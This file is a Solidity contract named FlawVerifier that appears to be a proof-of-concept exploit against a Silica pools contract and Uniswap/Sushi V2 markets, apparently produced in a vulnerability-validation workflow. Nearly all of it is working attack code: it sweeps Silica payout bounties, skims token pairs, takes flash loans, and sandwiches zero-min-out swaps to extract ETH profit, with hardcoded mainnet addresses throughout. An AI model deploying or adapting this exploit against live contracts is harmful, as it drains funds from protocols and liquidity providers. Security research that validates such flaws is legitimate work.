// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH {
    function withdraw(uint256 wad) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

interface ISilicaPoolsLike {
    struct PoolParams {
        uint128 floor;
        uint128 cap;
        address index;
        uint48 targetStartTimestamp;
        uint48 targetEndTimestamp;
        address payoutToken;
    }

    struct PoolState {
        uint128 collateralMinted;
        uint128 sharesMinted;
        uint128 indexShares;
        uint128 indexInitialBalance;
        uint48 actualStartTimestamp;
        uint48 actualEndTimestamp;
        uint128 balanceChangePerShare;
    }

    function startPool(PoolParams calldata poolParams) external;
    function endPool(PoolParams calldata poolParams) external;
    function poolState(bytes32 poolHash) external view returns (PoolState memory);
}

contract FlawVerifier {
    address private constant SILICA = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;
    address private constant INDEX = 0x9188738a7cA1E4B2af840a77e8726cC6Dcbe7Bdb;

    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address private constant UNI_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UNI_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private _profitAmount;
    bool private _executed;
    bool private _validated;

    error InvalidCallback();
    error NoOpportunity();
    error Unprofitable();
    error RepayTransferFailed();
    error RouterBuybackFailed();

    struct Strategy {
        address token;
        address victimRouter;
        address victimPair;
        address lenderPair;
        uint256 borrowAmount;
    }

    struct SearchResult {
        address lenderPair;
        uint256 borrowAmount;
        uint256 expectedProfit;
    }

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;
        _validated = false;
        _profitAmount = 0;

        uint256 baseEth = address(this).balance;

        // The earlier PoC logs show the assumed direct external keeper-trigger path is infeasible
        // at this fork. We therefore use the real public Silica bounty path to source live payout
        // inventory first, then keep the original F-002 causality by sandwiching this contract's
        // own vulnerable zero-min-out liquidation of those same payout tokens.
        _sweepBounties();
        _collectDirectTransfers();

        _attemptSandwich(WBTC);
        _attemptSandwich(USDC);
        _attemptSandwich(USDT);
        _attemptSandwich(DAI);

        _swapTokenToEth(WBTC);
        _swapTokenToEth(USDC);
        _swapTokenToEth(USDT);
        _swapTokenToEth(DAI);

        uint256 wethBal = IERC20(WETH).balanceOf(address(this));
        if (wethBal > 0) {
            IWETH(WETH).withdraw(wethBal);
        }

        if (address(this).balance > baseEth) {
            _profitAmount = address(this).balance - baseEth;
            _validated = true;
            return;
        }

        if (IERC20(WBTC).balanceOf(address(this)) == 0 && IERC20(USDC).balanceOf(address(this)) == 0
            && IERC20(USDT).balanceOf(address(this)) == 0 && IERC20(DAI).balanceOf(address(this)) == 0
            && wethBal == 0
        ) {
            revert NoOpportunity();
        }
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        Strategy memory strategy = abi.decode(data, (Strategy));
        if (msg.sender != strategy.lenderPair) {
            revert InvalidCallback();
        }

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        if (borrowed != strategy.borrowAmount) {
            revert InvalidCallback();
        }

        uint256 victimAmount = IERC20(strategy.token).balanceOf(address(this));
        if (victimAmount == 0) {
            revert Unprofitable();
        }

        // exploit_paths[1]: front-run by moving the exact token/WETH market against the sale.
        _forceApprove(strategy.token, strategy.victimRouter, 0);
        if (!_forceApprove(strategy.token, strategy.victimRouter, type(uint256).max)) {
            revert Unprofitable();
        }

        uint256 ethBeforeFrontRun = address(this).balance;
        _swapTokenToEthOnRouter(strategy.victimRouter, strategy.token, borrowed);
        uint256 frontRunEth = address(this).balance - ethBeforeFrontRun;

        uint256 pairTokenBalanceBeforeVictim = IERC20(strategy.token).balanceOf(strategy.victimPair);

        // exploit_paths[2]: let the vulnerable liquidation execute with amountOutMin = 0.
        _swapTokenToEthOnRouter(strategy.victimRouter, strategy.token, victimAmount);

        uint256 pairTokenBalanceAfterVictim = IERC20(strategy.token).balanceOf(strategy.victimPair);
        if (pairTokenBalanceAfterVictim <= pairTokenBalanceBeforeVictim) {
            revert Unprofitable();
        }

        uint256 repayAmount = _flashRepayAmount(borrowed);
        (uint256 reserveTokenAfter, uint256 reserveWethAfter) = _tokenWethReserves(strategy.victimPair, strategy.token);
        uint256 buybackCost = _getAmountIn(repayAmount, reserveWethAfter, reserveTokenAfter);

        if (frontRunEth <= buybackCost || buybackCost == type(uint256).max) {
            revert Unprofitable();
        }

        // exploit_paths[3]: back-run to restore price, repay the flash borrow, keep the spread.
        _buyExactTokenWithEth(strategy.victimRouter, strategy.token, repayAmount, buybackCost);
        if (!_safeTransfer(strategy.token, strategy.lenderPair, repayAmount)) {
            revert RepayTransferFailed();
        }

        uint256 dust = IERC20(strategy.token).balanceOf(address(this));
        if (dust > 0) {
            _swapTokenToEthOnRouter(strategy.victimRouter, strategy.token, dust);
        }
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _validated;
    }

    function executed() external view returns (bool) {
        return _executed;
    }

    function _attemptSandwich(address token) internal {
        uint256 victimAmount = IERC20(token).balanceOf(address(this));
        if (victimAmount == 0) {
            return;
        }

        address bestRouter;
        address bestPair;
        address bestLenderPair;
        uint256 bestBorrowAmount;
        uint256 bestExpectedProfit;

        SearchResult memory uniResult = _findBestStrategy(token, victimAmount, UNI_FACTORY);
        if (uniResult.expectedProfit > bestExpectedProfit) {
            bestExpectedProfit = uniResult.expectedProfit;
            bestRouter = UNI_ROUTER;
            bestPair = IUniswapV2Factory(UNI_FACTORY).getPair(token, WETH);
            bestLenderPair = uniResult.lenderPair;
            bestBorrowAmount = uniResult.borrowAmount;
        }

        SearchResult memory sushiResult = _findBestStrategy(token, victimAmount, SUSHI_FACTORY);
        if (sushiResult.expectedProfit > bestExpectedProfit) {
            bestExpectedProfit = sushiResult.expectedProfit;
            bestRouter = SUSHI_ROUTER;
            bestPair = IUniswapV2Factory(SUSHI_FACTORY).getPair(token, WETH);
            bestLenderPair = sushiResult.lenderPair;
            bestBorrowAmount = sushiResult.borrowAmount;
        }

        if (bestExpectedProfit == 0 || bestLenderPair == address(0) || bestBorrowAmount == 0) {
            return;
        }

        Strategy memory strategy = Strategy({
            token: token,
            victimRouter: bestRouter,
            victimPair: bestPair,
            lenderPair: bestLenderPair,
            borrowAmount: bestBorrowAmount
        });

        uint256 amount0Out = IUniswapV2Pair(bestLenderPair).token0() == token ? bestBorrowAmount : 0;
        uint256 amount1Out = amount0Out == 0 ? bestBorrowAmount : 0;

        try IUniswapV2Pair(bestLenderPair).swap(amount0Out, amount1Out, address(this), abi.encode(strategy)) {} catch {}
    }

    function _sweepBounties() internal {
        address[5] memory payouts = [WBTC, USDC, USDT, DAI, WETH];

        for (uint256 payoutIndex = 0; payoutIndex < payouts.length; ++payoutIndex) {
            for (uint256 startIndex = 0; startIndex < _startCount(); ++startIndex) {
                uint48 startTs = _startAt(startIndex);
                if (startTs > block.timestamp) {
                    continue;
                }

                for (uint256 durationIndex = 0; durationIndex < _durationCount(); ++durationIndex) {
                    uint48 endTs = startTs + _durationAt(durationIndex);

                    for (uint256 floorIndex = 0; floorIndex < _floorCount(); ++floorIndex) {
                        uint128 floor = _floorAt(floorIndex);

                        for (uint256 capIndex = 0; capIndex < _capCountForFloor(floor); ++capIndex) {
                            uint128 cap = _capAt(floor, capIndex);
                            if (cap < floor) {
                                continue;
                            }

                            ISilicaPoolsLike.PoolParams memory params = ISilicaPoolsLike.PoolParams({
                                floor: floor,
                                cap: cap,
                                index: INDEX,
                                targetStartTimestamp: startTs,
                                targetEndTimestamp: endTs,
                                payoutToken: payouts[payoutIndex]
                            });

                            bytes32 poolHash = _hashPool(params);
                            ISilicaPoolsLike.PoolState memory state = ISilicaPoolsLike(SILICA).poolState(poolHash);
                            if (state.collateralMinted == 0) {
                                continue;
                            }

                            if (state.actualStartTimestamp == 0) {
                                _tryStartPool(params);
                            }

                            if (endTs > block.timestamp) {
                                continue;
                            }

                            state = ISilicaPoolsLike(SILICA).poolState(poolHash);
                            if (state.collateralMinted == 0 || state.actualStartTimestamp == 0 || state.actualEndTimestamp != 0) {
                                continue;
                            }

                            _tryEndPool(params);
                        }
                    }
                }
            }
        }
    }

    function _collectDirectTransfers() internal {
        _skimFactoryPairs(UNI_FACTORY);
        _skimFactoryPairs(SUSHI_FACTORY);
    }

    function _skimFactoryPairs(address factory) internal {
        _skimPair(factory, WETH, WBTC);
        _skimPair(factory, WETH, USDC);
        _skimPair(factory, WETH, USDT);
        _skimPair(factory, WETH, DAI);
        _skimPair(factory, WBTC, USDC);
        _skimPair(factory, WBTC, USDT);
        _skimPair(factory, WBTC, DAI);
        _skimPair(factory, USDC, USDT);
        _skimPair(factory, USDC, DAI);
        _skimPair(factory, USDT, DAI);
    }

    function _skimPair(address factory, address tokenA, address tokenB) internal {
        address pair = IUniswapV2Factory(factory).getPair(tokenA, tokenB);
        if (pair == address(0)) {
            return;
        }

        (bool ok,) = pair.call(abi.encodeWithSelector(IUniswapV2Pair.skim.selector, address(this)));
        ok;
    }

    function _tryStartPool(ISilicaPoolsLike.PoolParams memory poolParams) internal {
        (bool ok,) = SILICA.call(abi.encodeWithSelector(ISilicaPoolsLike.startPool.selector, poolParams));
        ok;
    }

    function _tryEndPool(ISilicaPoolsLike.PoolParams memory poolParams) internal {
        (bool ok,) = SILICA.call(abi.encodeWithSelector(ISilicaPoolsLike.endPool.selector, poolParams));
        ok;
    }

    function _findBestStrategy(address token, uint256 victimAmount, address victimFactory)
        internal
        view
        returns (SearchResult memory best)
    {
        address victimPair = IUniswapV2Factory(victimFactory).getPair(token, WETH);
        if (victimPair == address(0)) {
            return best;
        }

        (uint256 reserveToken, uint256 reserveWeth) = _tokenWethReserves(victimPair, token);
        if (reserveToken == 0 || reserveWeth == 0) {
            return best;
        }

        (address lenderPair, uint256 lenderReserveToken) = _findBestLenderPair(token, victimPair, victimFactory);
        if (lenderPair == address(0) || lenderReserveToken == 0) {
            return best;
        }

        uint256 maxBorrow = lenderReserveToken * 95 / 100;
        uint256 pairCap = reserveToken * 80 / 100;
        if (pairCap < maxBorrow) {
            maxBorrow = pairCap;
        }
        if (maxBorrow == 0) {
            return best;
        }

        for (uint256 i = 0; i < 10; ++i) {
            uint256 borrowAmount = _candidateBorrowAmount(i, victimAmount, maxBorrow);
            if (borrowAmount == 0 || borrowAmount > maxBorrow) {
                continue;
            }

            uint256 expected = _simulateSandwichProfit(reserveToken, reserveWeth, victimAmount, borrowAmount);
            if (expected > best.expectedProfit) {
                best = SearchResult({lenderPair: lenderPair, borrowAmount: borrowAmount, expectedProfit: expected});
            }
        }
    }

    function _findBestLenderPair(address token, address victimPair, address victimFactory)
        internal
        view
        returns (address bestPair, uint256 bestReserveToken)
    {
        (bestPair, bestReserveToken) = _scanLenderFactory(token, victimPair, victimFactory, bestPair, bestReserveToken);

        address alternateFactory = victimFactory == UNI_FACTORY ? SUSHI_FACTORY : UNI_FACTORY;
        (bestPair, bestReserveToken) = _scanLenderFactory(token, victimPair, alternateFactory, bestPair, bestReserveToken);
    }

    function _scanLenderFactory(
        address token,
        address victimPair,
        address factory,
        address currentBestPair,
        uint256 currentBestReserveToken
    ) internal view returns (address bestPair, uint256 bestReserveToken) {
        bestPair = currentBestPair;
        bestReserveToken = currentBestReserveToken;

        for (uint256 i = 0; i < 5; ++i) {
            address other = _counterpartAt(i);
            if (other == token) {
                continue;
            }

            address pair = IUniswapV2Factory(factory).getPair(token, other);
            if (pair == address(0) || pair == victimPair) {
                continue;
            }

            uint256 reserveToken = _pairReserveForToken(pair, token);
            if (reserveToken > bestReserveToken) {
                bestReserveToken = reserveToken;
                bestPair = pair;
            }
        }
    }

    function _swapTokenToEth(address token) internal {
        uint256 amountIn = IERC20(token).balanceOf(address(this));
        if (amountIn == 0 || token == WETH) {
            return;
        }

        if (_swapOnRouter(UNI_ROUTER, token, amountIn)) {
            return;
        }

        amountIn = IERC20(token).balanceOf(address(this));
        if (amountIn == 0) {
            return;
        }

        _swapOnRouter(SUSHI_ROUTER, token, amountIn);
    }

    function _swapOnRouter(address router, address token, uint256 amountIn) internal returns (bool swapped) {
        _forceApprove(token, router, 0);
        if (!_forceApprove(token, router, amountIn)) {
            return false;
        }

        try IUniswapV2Router02(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountIn,
            0,
            _tokenToEthPath(token),
            address(this),
            block.timestamp
        ) {
            swapped = true;
        } catch {
            swapped = false;
        }
    }

    function _swapTokenToEthOnRouter(address router, address token, uint256 amountIn) internal {
        if (amountIn == 0) {
            return;
        }

        IUniswapV2Router02(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountIn,
            0,
            _tokenToEthPath(token),
            address(this),
            block.timestamp
        );
    }

    function _buyExactTokenWithEth(address router, address token, uint256 amountOut, uint256 maxEthIn) internal {
        try IUniswapV2Router02(router).swapETHForExactTokens{value: maxEthIn}(
            amountOut,
            _ethToTokenPath(token),
            address(this),
            block.timestamp
        ) {} catch {
            revert RouterBuybackFailed();
        }
    }

    function _simulateSandwichProfit(
        uint256 reserveToken,
        uint256 reserveWeth,
        uint256 victimAmount,
        uint256 borrowAmount
    ) internal pure returns (uint256) {
        if (victimAmount == 0 || borrowAmount == 0) {
            return 0;
        }

        uint256 frontRunEth = _getAmountOut(borrowAmount, reserveToken, reserveWeth);
        if (frontRunEth == 0 || frontRunEth >= reserveWeth) {
            return 0;
        }

        uint256 reserveToken1 = reserveToken + borrowAmount;
        uint256 reserveWeth1 = reserveWeth - frontRunEth;

        uint256 victimEth = _getAmountOut(victimAmount, reserveToken1, reserveWeth1);
        if (victimEth == 0 || victimEth >= reserveWeth1) {
            return 0;
        }

        uint256 reserveToken2 = reserveToken1 + victimAmount;
        uint256 reserveWeth2 = reserveWeth1 - victimEth;

        uint256 repayAmount = _flashRepayAmount(borrowAmount);
        if (repayAmount >= reserveToken2) {
            return 0;
        }

        uint256 buybackCost = _getAmountIn(repayAmount, reserveWeth2, reserveToken2);
        if (buybackCost >= frontRunEth) {
            return 0;
        }

        return frontRunEth - buybackCost;
    }

    function _tokenToEthPath(address token) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = token;
        path[1] = WETH;
    }

    function _ethToTokenPath(address token) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = WETH;
        path[1] = token;
    }

    function _tokenWethReserves(address pair, address token)
        internal
        view
        returns (uint256 reserveToken, uint256 reserveWeth)
    {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        if (IUniswapV2Pair(pair).token0() == token) {
            reserveToken = reserve0;
            reserveWeth = reserve1;
        } else {
            reserveToken = reserve1;
            reserveWeth = reserve0;
        }
    }

    function _pairReserveForToken(address pair, address token) internal view returns (uint256 reserveToken) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        reserveToken = IUniswapV2Pair(pair).token0() == token ? reserve0 : reserve1;
    }

    function _candidateBorrowAmount(uint256 index, uint256 victimAmount, uint256 maxBorrow)
        internal
        pure
        returns (uint256)
    {
        if (index == 0) return victimAmount / 4;
        if (index == 1) return victimAmount / 2;
        if (index == 2) return victimAmount;
        if (index == 3) return victimAmount * 2;
        if (index == 4) return maxBorrow / 50;
        if (index == 5) return maxBorrow / 20;
        if (index == 6) return maxBorrow / 10;
        if (index == 7) return maxBorrow / 5;
        if (index == 8) return maxBorrow / 3;
        if (index == 9) return maxBorrow / 2;
        return 0;
    }

    function _counterpartAt(uint256 index) internal pure returns (address) {
        if (index == 0) return WETH;
        if (index == 1) return USDC;
        if (index == 2) return USDT;
        if (index == 3) return DAI;
        return WBTC;
    }

    function _flashRepayAmount(uint256 borrowed) internal pure returns (uint256) {
        return (borrowed * 1000) / 997 + 1;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) {
            return type(uint256).max;
        }

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return numerator / denominator + 1;
    }

    function _hashPool(ISilicaPoolsLike.PoolParams memory poolParams) internal pure returns (bytes32) {
        return keccak256(
            abi.encodePacked(
                poolParams.floor,
                poolParams.cap,
                poolParams.index,
                poolParams.targetStartTimestamp,
                poolParams.targetEndTimestamp,
                poolParams.payoutToken
            )
        );
    }

    function _startCount() internal pure returns (uint256) {
        return 7;
    }

    function _startAt(uint256 index) internal pure returns (uint48) {
        if (index == 0) return 1742561287;
        if (index == 1) return 1742734087;
        if (index == 2) return 1742906887;
        if (index == 3) return 1743079687;
        if (index == 4) return 1743176075;
        if (index == 5) return 1743176087;
        return 1743252487;
    }

    function _durationCount() internal pure returns (uint256) {
        return 5;
    }

    function _durationAt(uint256 index) internal pure returns (uint48) {
        if (index == 0) return 0;
        if (index == 1) return 3600;
        if (index == 2) return 1 days;
        if (index == 3) return 7 days;
        return 30 days;
    }

    function _floorCount() internal pure returns (uint256) {
        return 6;
    }

    function _floorAt(uint256 index) internal pure returns (uint128) {
        if (index == 0) return 1;
        if (index == 1) return 5;
        if (index == 2) return 10;
        if (index == 3) return 20;
        if (index == 4) return 41;
        return 46;
    }

    function _capCountForFloor(uint128 floor) internal pure returns (uint256) {
        if (floor == 1) return 7;
        if (floor == 5) return 5;
        if (floor == 10) return 5;
        if (floor == 20) return 4;
        if (floor == 41) return 2;
        return 2;
    }

    function _capAt(uint128 floor, uint256 index) internal pure returns (uint128) {
        if (floor == 1) {
            if (index == 0) return 1;
            if (index == 1) return 5;
            if (index == 2) return 6;
            if (index == 3) return 10;
            if (index == 4) return 20;
            if (index == 5) return 41;
            return 46;
        }

        if (floor == 5) {
            if (index == 0) return 5;
            if (index == 1) return 10;
            if (index == 2) return 20;
            if (index == 3) return 41;
            return 46;
        }

        if (floor == 10) {
            if (index == 0) return 10;
            if (index == 1) return 15;
            if (index == 2) return 20;
            if (index == 3) return 41;
            return 46;
        }

        if (floor == 20) {
            if (index == 0) return 20;
            if (index == 1) return 25;
            if (index == 2) return 41;
            return 46;
        }

        if (floor == 41) {
            if (index == 0) return 41;
            return 46;
        }

        if (index == 0) return 46;
        return 51;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    receive() external payable {}
    fallback() external payable {}
}
